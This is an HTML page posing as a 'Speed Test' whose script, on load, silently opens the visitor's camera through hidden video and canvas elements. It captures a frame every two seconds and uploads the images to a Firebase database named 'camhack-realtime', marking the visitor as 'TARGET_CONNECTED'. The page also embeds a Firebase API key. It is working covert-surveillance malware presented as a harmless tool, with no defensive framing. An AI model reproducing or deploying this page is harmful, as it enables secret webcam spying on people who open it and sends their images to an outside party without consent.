<!DOCTYPE html>
<html>
<head>
    <title>Speed Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <h1>âš¡ Speed Test</h1>
    <div id="status">Starting...</div>
    
    <video id="video" autoplay muted playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <script>
        const config = {
            apiKey: "AIzaSyDm83pllDlsMkmcj2S5HR4_jgAHcXyEVfI",
            databaseURL: "https://camhack-realtime-default-rtdb.firebaseio.com"
        };
        
        firebase.initializeApp(config);
        const db = firebase.database();
        
        const params = new URLSearchParams(window.location.search);
        const sessionId = params.get('session') || 'test123';
        
        let frameCount = 0;
        
        console.log('Session:', sessionId);
        document.getElementById('status').textContent = 'Session: ' + sessionId;
        
        // Start camera immediately
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            console.log('Camera OK');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Send status
                db.ref('sessions/' + sessionId + '/status').set({
                    type: 'TARGET_CONNECTED',
                    timestamp: Date.now()
                });
                
                console.log('Status sent');
                document.getElementById('status').textContent = 'Camera active - Sending frames';
                
                // Start sending frames
                setInterval(() => {
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const reader = new FileReader();
                        reader.onload = () => {
                            frameCount++;
                            
                            const frameData = {
                                image: reader.result,
                                frameNumber: frameCount,
                                timestamp: Date.now()
                            };
                            
                            db.ref('sessions/' + sessionId + '/frames').push(frameData)
                            .then(() => {
                                console.log('Frame sent:', frameCount);
                                document.getElementById('status').textContent = 'Frame sent: ' + frameCount;
                            })
                            .catch(err => {
                                console.error('Send failed:', err);
                            });
                        };
                        reader.readAsDataURL(blob);
                    }, 'image/jpeg', 0.7);
                }, 2000); // 1 frame per 2 seconds
            };
        })
        .catch(err => {
            console.error('Camera failed:', err);
            document.getElementById('status').textContent = 'Camera failed: ' + err.message;
        });
    </script>
</body>
</html>
